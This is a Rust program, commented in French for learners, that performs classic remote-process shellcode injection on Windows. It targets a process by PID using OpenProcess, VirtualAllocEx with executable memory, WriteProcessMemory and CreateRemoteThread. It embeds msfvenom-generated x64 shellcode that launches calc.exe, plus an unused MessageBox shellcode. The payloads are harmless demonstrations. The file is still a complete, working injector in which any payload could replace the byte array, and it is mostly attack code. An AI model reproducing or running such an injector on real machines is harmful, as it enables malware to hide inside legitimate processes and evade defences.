// ============================================================================
// IMPORTS - On importe les bibliothèques nécessaires
// ============================================================================

// std::ptr - Bibliothèque standard Rust pour manipuler les pointeurs
// Un pointeur est une adresse mémoire qui "pointe" vers un emplacement
use std::ptr;

// Les lignes ci-dessous ne sont compilées QUE sur Windows
// #[cfg(windows)] = "compile seulement si on est sur Windows"
#[cfg(windows)]
use winapi::um::memoryapi::{
    VirtualAllocEx,      // Fonction pour allouer de la mémoire dans UN AUTRE processus
    VirtualFreeEx,       // Fonction pour libérer la mémoire dans un autre processus
    WriteProcessMemory   // Fonction pour écrire des données dans la mémoire d'un autre processus
};

#[cfg(windows)]
use winapi::um::processthreadsapi::{
    OpenProcess,         // Ouvre un "handle" (poignée) vers un processus pour pouvoir le manipuler
    CreateRemoteThread   // Crée un nouveau thread (fil d'exécution) dans un autre processus
};

#[cfg(windows)]
use winapi::um::handleapi::CloseHandle; // Ferme un handle (libère la ressource)

#[cfg(windows)]
use winapi::um::synchapi::WaitForSingleObject; // Attend qu'un objet se termine

#[cfg(windows)]
use winapi::um::winnt::{
    PROCESS_ALL_ACCESS,      // Constante: demande TOUS les droits sur un processus
    MEM_COMMIT,              // Constante: réserve ET alloue de la mémoire physique
    MEM_RESERVE,             // Constante: réserve de l'espace mémoire (sans l'allouer encore)
    MEM_RELEASE,             // Constante: libère complètement la mémoire
    PAGE_EXECUTE_READWRITE   // Constante: la mémoire peut être lue, écrite ET exécutée
};

#[cfg(windows)]
use winapi::shared::minwindef::{
    LPVOID,  // Type: "Long Pointer to VOID" = pointeur générique (adresse mémoire)
    FALSE    // Constante: la valeur booléenne FALSE (0) pour Windows API
};

#[cfg(windows)]
use winapi::ctypes::c_void; // Type C "void" utilisé pour les pointeurs génériques

#[cfg(windows)]
use winapi::um::winbase::INFINITE; // Constante: attendre infiniment (pour WaitForSingleObject)

// ============================================================================
// FONCTION MAIN - Point d'entrée du programme
// ============================================================================

fn main() {
    // Si on N'EST PAS sur Windows, afficher une erreur et quitter
    #[cfg(not(windows))]
    {
        eprintln!("Ce programme nécessite Windows!");
        std::process::exit(1); // Quitte avec code d'erreur 1
    }
    
    // Si on EST sur Windows, exécuter ce code
    #[cfg(windows)]
    {
        println!("=== Injection Shellcode - Calculatrice Windows ===\n");
        
        // Récupérer le PID (Process ID) depuis les arguments de ligne de commande
        // std::env::args() = liste des arguments passés au programme
        // .nth(1) = récupère le 2ème argument (index 1, car 0 = nom du programme)
        // .and_then() = si l'argument existe, essaie de le convertir
        // .parse() = convertit une chaîne de texte en nombre
        // .ok() = convertit Result en Option (ignore les erreurs)
        // .unwrap_or_else() = si aucun argument valide, exécute la fonction ci-dessous
        let pid: u32 = std::env::args()
            .nth(1)
            .and_then(|s| s.parse().ok())
            .unwrap_or_else(|| {
                // Cette fonction s'exécute si aucun PID n'a été fourni
                println!("Usage: {} <PID>", std::env::args().next().unwrap());
                println!("Exemple: {} 1234", std::env::args().next().unwrap());
                println!("\nCe programme va injecter un shellcode qui lance calc.exe");
                println!("Testez avec notepad.exe pour la sécurité");
                std::process::exit(1); // Quitte le programme
            });
        
        // unsafe = bloc de code "non sûr" (Rust ne peut pas garantir la sécurité)
        // Nécessaire car on manipule de la mémoire brute et des fonctions Windows
        unsafe {
            // match = comme un switch/case, gère le résultat (succès ou erreur)
            match injecter_shellcode(pid) {
                Ok(_) => println!("\n✓ Shellcode exécuté! La calculatrice devrait s'ouvrir."),
                Err(e) => eprintln!("\n✗ Erreur: {}", e),
            }
        }
    }
}

// ============================================================================
// FONCTION PRINCIPALE D'INJECTION
// ============================================================================

#[cfg(windows)] // Compile uniquement sur Windows
// unsafe fn = fonction "non sûre" (manipule de la mémoire brute)
// pid: u32 = paramètre: Process ID (nombre entier 32-bit non signé)
// -> Result<(), String> = retourne soit succès () soit une erreur (String)
unsafe fn injecter_shellcode(pid: u32) -> Result<(), String> {
    println!("Cible: PID {}", pid);
    
    // ========================================================================
    // ÉTAPE 0: Préparer le shellcode (code machine à injecter)
    // ========================================================================
    
    // vec! = macro pour créer un vecteur (tableau dynamique)
    // Vec<u8> = vecteur d'octets (u8 = unsigned 8-bit = 0 à 255)
    // Ce shellcode est du code machine x64 qui lance calc.exe
    // Généré avec: msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread
    let shellcode: Vec<u8> = vec![
        // Chaque nombre = 1 octet (byte) d'instructions machine
        // 0xfc = opcode machine (instruction pour le processeur)
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
        0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
        0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
        0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
        0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
        0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
        0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];
    
    // .len() = retourne la longueur du vecteur (nombre d'éléments)
    println!("✓ Shellcode calc.exe chargé ({} bytes)", shellcode.len());
    
    // ========================================================================
    // ÉTAPE 1: Ouvrir le processus cible
    // ========================================================================
    
    // unsafe { } = bloc de code non-sûr (requis pour Rust 2024)
    // OpenProcess() = fonction Windows qui ouvre un processus
    // Paramètres:
    //   - PROCESS_ALL_ACCESS = on veut TOUS les droits sur ce processus
    //   - FALSE = pas d'héritage du handle (sécurité)
    //   - pid = l'ID du processus qu'on veut ouvrir
    // Retour: un HANDLE (pointeur) vers le processus, ou NULL si échec
    let h_process = unsafe {
        OpenProcess(
            PROCESS_ALL_ACCESS, // Droits demandés (lecture, écriture, création thread, etc.)
            FALSE,              // bInheritHandle: les processus enfants n'hériteront pas ce handle
            pid                 // dwProcessId: l'ID du processus à ouvrir
        )
    };
    
    // .is_null() = vérifie si le pointeur est NULL (0x0)
    // NULL signifie que la fonction a échoué
    if h_process.is_null() {
        // format! = macro qui crée une String formatée (comme sprintf en C)
        // return Err() = retourne une erreur et quitte la fonction
        return Err(format!(
            "Impossible d'ouvrir le processus {}. Exécutez en administrateur.",
            pid
        ));
    }
    // {:p} = format d'affichage pour un pointeur (adresse hexadécimale)
    println!("✓ Processus ouvert: {:p}", h_process);
    
    // ========================================================================
    // ÉTAPE 2: Allouer de la mémoire dans le processus distant
    // ========================================================================
    
    // VirtualAllocEx() = alloue de la mémoire dans UN AUTRE processus
    // C'est comme malloc() mais pour un autre processus
    let remote_addr = unsafe {
        VirtualAllocEx(
            h_process,              // Handle du processus où allouer
            ptr::null_mut(),        // lpAddress: NULL = Windows choisit l'adresse
            shellcode.len(),        // dwSize: taille en bytes à allouer
            MEM_COMMIT | MEM_RESERVE, // flAllocationType: réserve ET alloue (2 étapes en 1)
            PAGE_EXECUTE_READWRITE  // flProtect: lecture + écriture + EXÉCUTION (important!)
        )
    };
    
    // Vérifier que l'allocation a réussi
    if remote_addr.is_null() {
        // En cas d'échec, on ferme le handle du processus
        unsafe { CloseHandle(h_process); }
        return Err("VirtualAllocEx a échoué".to_string());
    }
    println!("✓ Mémoire exécutable allouée à: {:p}", remote_addr);
    
    // ========================================================================
    // ÉTAPE 3: Écrire le shellcode dans la mémoire du processus distant
    // ========================================================================
    
    // let mut = déclare une variable MUTABLE (qu'on peut modifier)
    // usize = type entier non-signé de la taille d'un pointeur (32 ou 64 bit)
    let mut bytes_written: usize = 0;
    
    // WriteProcessMemory() = écrit des données dans la mémoire d'un autre processus
    // C'est comme memcpy() mais inter-processus
    let result = unsafe {
        WriteProcessMemory(
            h_process,                         // hProcess: handle du processus cible
            remote_addr,                       // lpBaseAddress: où écrire (adresse qu'on a allouée)
            shellcode.as_ptr() as *const c_void, // lpBuffer: pointeur vers nos données (le shellcode)
            shellcode.len(),                   // nSize: combien de bytes écrire
            &mut bytes_written,                // lpNumberOfBytesWritten: pointeur où Windows écrira le nombre de bytes écrits
        )
    };
    
    // result == 0 signifie ÉCHEC (en Windows API, 0 = false = échec)
    // || = opérateur logique OU
    // != = différent de
    if result == 0 || bytes_written != shellcode.len() {
        // En cas d'erreur, nettoyer (libérer mémoire et fermer handle)
        unsafe {
            VirtualFreeEx(h_process, remote_addr, 0, MEM_RELEASE);
            CloseHandle(h_process);
        }
        // .to_string() = convertit un &str (string static) en String (owned)
        return Err("WriteProcessMemory a échoué".to_string());
    }
    println!("✓ Shellcode écrit ({} bytes)", bytes_written);
    
    // ========================================================================
    // ÉTAPE 4: Créer un thread distant pour exécuter le shellcode
    // ========================================================================
    
    println!("✓ Création du thread distant...");
    
    // CreateRemoteThread() = crée un nouveau thread dans un autre processus
    // Un thread = fil d'exécution (comme un mini-programme qui tourne en parallèle)
    let h_thread = unsafe {
        CreateRemoteThread(
            h_process,              // hProcess: dans quel processus créer le thread
            ptr::null_mut(),        // lpThreadAttributes: NULL = attributs par défaut
            0,                      // dwStackSize: 0 = taille de pile par défaut
            // Some() = Option avec une valeur
            // std::mem::transmute() = convertit un type en un autre (DANGEREUX!)
            // On convertit notre adresse mémoire en pointeur de fonction
            Some(std::mem::transmute(remote_addr)), // lpStartAddress: fonction à exécuter = notre shellcode!
            ptr::null_mut(),        // lpParameter: paramètre passé au thread (aucun)
            0,                      // dwCreationFlags: 0 = démarre immédiatement
            ptr::null_mut(),        // lpThreadId: NULL = on ne veut pas récupérer l'ID
        )
    };
    
    // Vérifier que la création du thread a réussi
    if h_thread.is_null() {
        // Nettoyer en cas d'erreur
        unsafe {
            VirtualFreeEx(h_process, remote_addr, 0, MEM_RELEASE);
            CloseHandle(h_process);
        }
        return Err("CreateRemoteThread a échoué".to_string());
    }
    println!("✓ Thread distant créé: {:p}", h_thread);
    println!("✓ Exécution du shellcode...");
    
    // ========================================================================
    // ÉTAPE 5: Attendre un peu (le shellcode lance calc.exe)
    // ========================================================================
    
    // std::thread::sleep() = met en pause le thread actuel
    // std::time::Duration::from_secs(2) = durée de 2 secondes
    std::thread::sleep(std::time::Duration::from_secs(2));
    
    // ========================================================================
    // ÉTAPE 6: Nettoyage (libérer les ressources)
    // ========================================================================
    
    unsafe {
        // CloseHandle() = ferme un handle (libère la ressource système)
        // Important: toujours fermer les handles qu'on ouvre!
        CloseHandle(h_thread);
        
        // NOTE: On ne libère PAS la mémoire avec VirtualFreeEx()
        // car calc.exe continue à tourner et utilise cette mémoire
        // Si on libérait, calc.exe planterait
        
        CloseHandle(h_process);
    }
    println!("✓ Thread fermé (calc.exe continue à tourner)");
    
    // Ok(()) = retourne un succès (pas d'erreur)
    // () = "unit type" en Rust = comme "void" en C
    Ok(())
}

// ============================================================================
// FONCTION BONUS: Shellcode MessageBox (non utilisée, juste pour référence)
// ============================================================================

// #[allow(dead_code)] = dit au compilateur de ne pas avertir si cette fonction n'est pas utilisée
#[allow(dead_code)]
#[cfg(windows)]
fn get_messagebox_shellcode() -> Vec<u8> {
    // Ce shellcode affiche une MessageBox au lieu de lancer calc.exe
    // Généré avec: msfvenom -p windows/x64/messagebox TEXT="Injected!" TITLE="Rust"
    vec![
        0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
        0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
        0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
        0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
        0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
        0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
        0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
        0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
        0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
        0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
        0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
        0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
        0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
        0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
        0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
        0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
        0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
        0x00, 0x48, 0x8d, 0x95, 0xfe, 0x00, 0x00, 0x00, 0x3e, 0x4c, 0x8d, 0x85,
        0x09, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56,
        0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56,
        0xff, 0xd5, 0x49, 0x6e, 0x6a, 0x65, 0x63, 0x74, 0x65, 0x64, 0x21, 0x00,
        0x52, 0x75, 0x73, 0x74, 0x00,
    ]
}

// ============================================================================
// CONCEPTS IMPORTANTS À COMPRENDRE:
// ============================================================================
// 
// 1. HANDLE: Un "handle" est comme un numéro de ticket qui représente une
//    ressource système (processus, thread, fichier, etc.). Windows utilise
//    ces handles pour savoir de quelle ressource vous parlez.
//
// 2. POINTEUR: Une adresse mémoire. Comme une adresse postale, mais pour
//    la RAM de l'ordinateur. Exemple: 0x00007FF8A1B2C3D0
//
// 3. SHELLCODE: Du code machine (instructions directes pour le CPU) sous
//    forme de bytes. C'est comme du code assembleur converti en nombres.
//
// 4. PROCESS: Un programme en cours d'exécution. Chaque .exe lancé crée
//    un processus. Chaque processus a son propre espace mémoire.
//
// 5. THREAD: Un fil d'exécution dans un processus. Un processus peut avoir
//    plusieurs threads qui s'exécutent en parallèle.
//
// 6. PID: Process ID = numéro unique qui identifie un processus en cours.
//
// 7. MEMORY PROTECTION: Windows protège la mémoire des processus. Pour
//    exécuter du code, la mémoire doit avoir la permission PAGE_EXECUTE.
//
// 8. UNSAFE: En Rust, manipuler de la mémoire brute ou appeler des fonctions
//    système est "unsafe" car Rust ne peut pas vérifier que c'est sûr.
//
// ============================================================================